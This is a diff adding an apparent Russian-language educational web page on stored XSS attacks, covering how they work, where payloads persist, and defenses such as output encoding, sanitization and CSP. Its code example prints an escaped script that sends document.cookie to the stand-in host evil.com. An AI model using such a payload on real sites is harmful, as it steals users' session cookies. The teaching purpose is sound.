@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>XSS DOC | Stored XSS атаки</title>
+
+    <!-- TAILWIND -->
+    <link rel="stylesheet" href="../assets/tailwind.css" />
+
+    <!-- YOUR CSS -->
+    <link rel="stylesheet" href="../style.css">
+</head>
+
+<body class="text-white font-sans antialiased bg-grid relative doc-page">
+
+    <!-- SIDEBAR -->
+    <div id="sidebar-container"></div>
+
+    <!-- BACKGROUND GLOW -->
+    <div class="fixed inset-0 overflow-hidden -z-10 pointer-events-none">
+
+        <div class="absolute top-0 left-0 w-[600px] h-[600px]
+            bg-red-500/20 blur-[160px] rounded-full">
+        </div>
+
+        <div class="absolute bottom-0 right-0 w-[500px] h-[500px]
+            bg-cyan-500/15 blur-[160px] rounded-full">
+        </div>
+
+        <div class="absolute top-1/3 left-1/4 w-[400px] h-[400px]
+            bg-purple-700/10 blur-[140px] rounded-full">
+        </div>
+
+    </div>
+
+    <!-- PAGE -->
+    <div class="site-shell doc-content px-4 lg:px-8">
+
+        <!-- HERO -->
+        <header class="flex flex-col items-center text-center
+            mt-14 md:mt-24 px-4">
+
+            <p class="uppercase tracking-[0.4em]
+                text-red-500 text-sm mb-5 font-semibold">
+
+                Cybersecurity • Web Protection
+
+            </p>
+
+            <h1 class="text-5xl md:text-7xl lg:text-6xl
+                font-black leading-tight
+                bg-gradient-to-r from-white via-red-200 to-red-500
+                bg-clip-text text-transparent">
+
+                Stored XSS атаки
+
+            </h1>
+
+            <div class="h-1 w-24 bg-red-500/60
+                rounded-full mt-8">
+            </div>
+
+        </header>
+
+        <!-- CONTENT -->
+        <main class="max-w-7xl mx-auto
+            px-5 py-12 md:py-20
+            text-white leading-relaxed">
+
+            <section class="space-y-14">
+
+                <!-- INTRO -->
+                <div class="card-glass rounded-3xl
+                    p-8 border border-red-500/10">
+
+                    <p class="text-gray-300 text-lg leading-9 mb-6">
+
+                        <span class="text-red-400 font-semibold">
+                            Stored XSS
+                        </span>
+
+                        (Persistent XSS или Type-II XSS) —
+                        это тип атаки, при котором
+                        вредоносный JavaScript-код
+                        сохраняется на сервере и затем
+                        автоматически выполняется
+                        у всех пользователей,
+                        открывающих заражённую страницу.
+
+                    </p>
+
+                    <p class="text-gray-300 text-lg leading-9">
+
+                        В отличие от Reflected XSS,
+                        payload существует постоянно,
+                        пока не будет удалён
+                        администратором
+                        или системой фильтрации.
+
+                    </p>
+
+                </div>
+
+                <!-- HOW IT WORKS -->
+                <div class="grid lg:grid-cols-2 gap-8">
+
+                    <!-- LEFT -->
+                    <div class="rounded-3xl
+                        border border-red-500/20
+                        bg-gradient-to-b from-zinc-900 to-black
+                        p-8">
+
+                        <h2 class="text-3xl font-bold
+                            text-red-400 mb-6">
+
+                            Где сохраняется скрипт
+
+                        </h2>
+
+                        <ul class="space-y-4
+                            text-gray-300 leading-8">
+
+                            <li class="flex gap-3">
+                                <span class="text-red-400">▸</span>
+                                Базы данных
+                            </li>
+
+                            <li class="flex gap-3">
+                                <span class="text-red-400">▸</span>
+                                Комментарии и форумы
+                            </li>
+
+                            <li class="flex gap-3">
+                                <span class="text-red-400">▸</span>
+                                Профили пользователей
+                            </li>
+
+                            <li class="flex gap-3">
+                                <span class="text-red-400">▸</span>
+                                Visitor logs и guest books
+                            </li>
+
+                            <li class="flex gap-3">
+                                <span class="text-red-400">▸</span>
+                                Чаты и системы сообщений
+                            </li>
+
+                        </ul>
+
+                    </div>
+
+                    <!-- RIGHT -->
+                    <div class="rounded-3xl
+                        border border-cyan-500/20
+                        bg-cyan-500/5
+                        p-8">
+
+                        <h2 class="text-3xl font-bold
+                            text-cyan-300 mb-6">
+
+                            Как работает атака
+
+                        </h2>
+
+                        <p class="text-gray-300
+                            leading-9 mb-5">
+
+                            Злоумышленник внедряет
+                            вредоносный скрипт через
+                            комментарий, профиль,
+                            форму обратной связи
+                            или любое другое поле ввода.
+
+                        </p>
+
+                        <p class="text-gray-300 leading-9">
+
+                            Сервер сохраняет payload,
+                            а затем автоматически
+                            отправляет его всем
+                            пользователям,
+                            открывающим заражённую страницу.
+
+                        </p>
+
+                    </div>
+
+                </div>
+
+                <!-- FLOW -->
+                <div class="relative overflow-hidden
+                    rounded-3xl
+                    border border-red-500/20
+                    bg-gradient-to-r
+                    from-red-950/20 via-black to-black
+                    p-10">
+
+                    <div class="absolute top-0 right-0
+                        w-72 h-72
+                        bg-red-500/10 blur-3xl
+                        rounded-full">
+                    </div>
+
+                    <div class="relative z-10">
+
+                        <h2 class="text-3xl font-black
+                            text-white mb-8">
+
+                            Сценарий Stored XSS
+
+                        </h2>
+
+                        <div class="grid
+                            md:grid-cols-2 xl:grid-cols-4
+                            gap-5">
+
+                            <div class="bg-black/40
+                                rounded-2xl p-5
+                                border border-white/5">
+
+                                <span class="text-red-400
+                                    text-2xl font-black">
+
+                                    01
+
+                                </span>
+
+                                <p class="text-gray-300
+                                    mt-4 leading-7">
+
+                                    Злоумышленник
+                                    отправляет payload
+                                    через форму.
+
+                                </p>
+
+                            </div>
+
+                            <div class="bg-black/40
+                                rounded-2xl p-5
+                                border border-white/5">
+
+                                <span class="text-red-400
+                                    text-2xl font-black">
+
+                                    02
+
+                                </span>
+
+                                <p class="text-gray-300
+                                    mt-4 leading-7">
+
+                                    Сервер сохраняет
+                                    скрипт в базе данных.
+
+                                </p>
+
+                            </div>
+
+                            <div class="bg-black/40
+                                rounded-2xl p-5
+                                border border-white/5">
+
+                                <span class="text-red-400
+                                    text-2xl font-black">
+
+                                    03
+
+                                </span>
+
+                                <p class="text-gray-300
+                                    mt-4 leading-7">
+
+                                    Пользователь открывает
+                                    заражённую страницу.
+
+                                </p>
+
+                            </div>
+
+                            <div class="bg-black/40
+                                rounded-2xl p-5
+                                border border-white/5">
+
+                                <span class="text-red-400
+                                    text-2xl font-black">
+
+                                    04
+
+                                </span>
+
+                                <p class="text-gray-300
+                                    mt-4 leading-7">
+
+                                    Браузер выполняет
+                                    вредоносный JavaScript.
+
+                                </p>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <!-- CODE -->
+                <div class="card-glass rounded-3xl
+                    p-10 border border-red-500/10">
+
+                    <h2 class="text-3xl font-black
+                        text-white mb-8">
+
+                        Пример Stored XSS
+
+                    </h2>
+
+                    <p class="text-gray-300
+                        text-lg leading-9 mb-6">
+
+                        Предположим, сайт позволяет
+                        оставлять комментарии
+                        без фильтрации HTML-кода:
+
+                    </p>
+
+                    <div class="rounded-2xl
+                        bg-black/60
+                        border border-zinc-800
+                        p-6 overflow-x-auto mb-6">
+
+<pre class="text-green-400 text-sm md:text-base leading-8"><code>&lt;script&gt;
+fetch('https://evil.com?c=' + document.cookie)
+&lt;/script&gt;</code></pre>
+
+                    </div>
+
+                    <p class="text-gray-300
+                        text-lg leading-9">
+
+                        Если приложение сохранит
+                        этот код в базе данных
+                        и затем покажет его другим
+                        пользователям —
+                        скрипт выполнится
+                        в браузере каждой жертвы.
+
+                    </p>
+
+                </div>
+
+                <!-- HTML5 -->
+                <div class="grid lg:grid-cols-2 gap-8">
+
+                    <!-- LEFT -->
+                    <div class="rounded-3xl
+                        border border-yellow-500/20
+                        bg-yellow-500/5
+                        p-8">
+
+                        <h2 class="text-3xl font-bold
+                            text-yellow-300 mb-6">
+
+                            HTML5 и новые риски
+
+                        </h2>
+
+                        <p class="text-gray-300 leading-9">
+
+                            С развитием HTML5 payload
+                            может храниться
+                            не только на сервере,
+                            но и внутри браузера:
+                            в localStorage,
+                            IndexedDB
+                            и других client-side хранилищах.
+
+                        </p>
+
+                    </div>
+
+                    <!-- RIGHT -->
+                    <div class="rounded-3xl
+                        border border-purple-500/20
+                        bg-purple-500/5
+                        p-8">
+
+                        <h2 class="text-3xl font-bold
+                            text-purple-300 mb-6">
+
+                            Почему Stored XSS опаснее
+
+                        </h2>
+
+                        <p class="text-gray-300 leading-9">
+
+                            Stored XSS способен
+                            автоматически заражать
+                            большое количество
+                            пользователей
+                            без необходимости
+                            отправлять каждому
+                            отдельную ссылку.
+
+                        </p>
+
+                    </div>
+
+                </div>
+
+                <!-- DEFENSE -->
+                <div class="card-glass rounded-3xl
+                    p-10 border border-cyan-500/20">
+
+                    <h2 class="text-3xl font-black
+                        text-cyan-300 mb-8">
+
+                        Основные методы защиты
+
+                    </h2>
+
+                    <div class="grid md:grid-cols-2 gap-6">
+
+                        <div class="bg-black/30
+                            rounded-2xl p-5
+                            border border-white/5">
+
+                            <p class="text-white
+                                font-semibold mb-2">
+
+                                Output Encoding
+
+                            </p>
+
+                            <p class="text-gray-400">
+
+                                Экранирование HTML
+                                перед выводом данных.
+
+                            </p>
+
+                        </div>
+
+                        <div class="bg-black/30
+                            rounded-2xl p-5
+                            border border-white/5">
+
+                            <p class="text-white
+                                font-semibold mb-2">
+
+                                HTML Sanitization
+
+                            </p>
+
+                            <p class="text-gray-400">
+
+                                Очистка опасных тегов
+                                и JavaScript-кода.
+
+                            </p>
+
+                        </div>
+
+                        <div class="bg-black/30
+                            rounded-2xl p-5
+                            border border-white/5">
+
+                            <p class="text-white
+                                font-semibold mb-2">
+
+                                Content Security Policy
+
+                            </p>
+
+                            <p class="text-gray-400">
+
+                                Ограничение выполнения
+                                inline-скриптов.
+
+                            </p>
+
+                        </div>
+
+                        <div class="bg-black/30
+                            rounded-2xl p-5
+                            border border-white/5">
+
+                            <p class="text-white
+                                font-semibold mb-2">
+
+                                Safe Rendering
+
+                            </p>
+
+                            <p class="text-gray-400">
+
+                                Использование безопасных
+                                шаблонизаторов.
+
+                            </p>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </section>
+
+            <div id="xss-quiz" data-quiz="types" class="max-w-3xl mx-auto px-2 mb-8"></div>
+
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="px-4 sm:px-10 lg:px-24 py-14
+            border-t border-white/10
+            mt-10 text-center">
+
+            <h3 class="text-2xl font-black
+                text-red-400 mb-4">
+
+                XSS SHIELD
+
+            </h3>
+
+            <p class="text-gray-400 mb-6">
+
+                Исследование и защита от
+                Cross-Site Scripting атак.
+
+            </p>
+
+            <div class="flex justify-center
+                gap-6 text-gray-400 text-sm">
+
+                <a href="https://github.com/RuslanSadvakasov"
+                    class="hover:text-red-400 transition">
+
+                    GitHub
+
+                </a>
+
+                <a href="https://t.me/sadvakasovruslan"
+                    class="hover:text-red-400 transition">
+
+                    Telegram
+
+                </a>
+
+            </div>
+
+            <p class="text-gray-500 text-sm mt-8">
+
+                © 2026 Sadvakasov Ruslan
+
+            </p>
+
+        </footer>
+
+    </div>
+
+    <!-- SIDEBAR SCRIPT -->
+    <script src="../assets/dom-safe.js"></script>
+    <script src="../assets/sidebar.js" defer></script>
+    <script src="../assets/quiz-data.js"></script>
+    <script src="../assets/quiz.js"></script>
+
+</body>
+</html>
